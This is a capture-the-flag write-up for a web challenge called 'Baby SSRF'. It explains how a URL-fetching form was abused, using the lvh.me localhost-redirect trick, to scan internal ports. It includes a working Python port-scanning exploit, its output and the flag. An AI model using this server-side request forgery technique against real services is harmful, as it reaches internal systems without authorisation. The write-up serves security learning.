# Baby SSRF

**Date:** 09, June, 2021

**Author:** Dhilip Sanjay S

**Category:** Web

---

- The `request page` in the website had a text box which accepted any valid URL.
- On submitting, it was fetching and displaying the headers of the request made to website.
- So, we must access some internal local server to get flag. (SSRF!)
- And the hint says `for i in range(5000,10000)`
- So, our flag must available in any of the headers of the following local ports.
- To redirect to localhost:
    - Use `lvh.me` (or) 
    - Develop a custom server and combine it with `ngrok`

## Exploit

```py
#! /usr/bin/python3

import requests

url = "http://web.zh3r0.cf:1111/request"
payloadURL = "http://lvh.me" # Redirects to localhost
req = requests.session()

for port in range(5000,10000):
	data = {"url" :  payloadURL + ":{}".format(str(port))}
	print("[+] Trying Port {}".format(str(port)))
	
	r = req.post(url, data)
	if "zh3r0" in r.text:
		print(r.text)
		break
```

- Run the exploit

```bash
./exploit.py

[..snip..]
[+] Trying Port 9000
[+] Trying Port 9001
[+] Trying Port 9002
[+] Trying Port 9003
[+] Trying Port 9004
[+] Trying Port 9005
[+] Trying Port 9006
<!DOCTYPE html>
<html>
<head>
        <title>Request</title>
</head>
<link rel="stylesheet" type="text/css" href="hacker.css">
<body>
        <form action="/request" method="POST">
                <input type="text" name="url">
                <input type="submit" name="sub" value="sub">
        </form>
        {&#39;Date&#39;: &#39;Wed, 09 Jun 2021 09:41:02 GMT&#39;, &#39;Server&#39;: &#39;Apache/2.4.41 (Ubuntu)&#39;, &#39;FLag&#39;: &#39;zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}&#39;, &#39;Content-Length&#39;: &#39;0&#39;, &#39;Keep-Alive&#39;: &#39;timeout=5, max=100&#39;, &#39;Connection&#39;: &#39;Keep-Alive&#39;, &#39;Content-Type&#39;: &#39;text/html; charset=UTF-8&#39;}
<br>
          
</body>
</html>
```

## Flag

zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}

---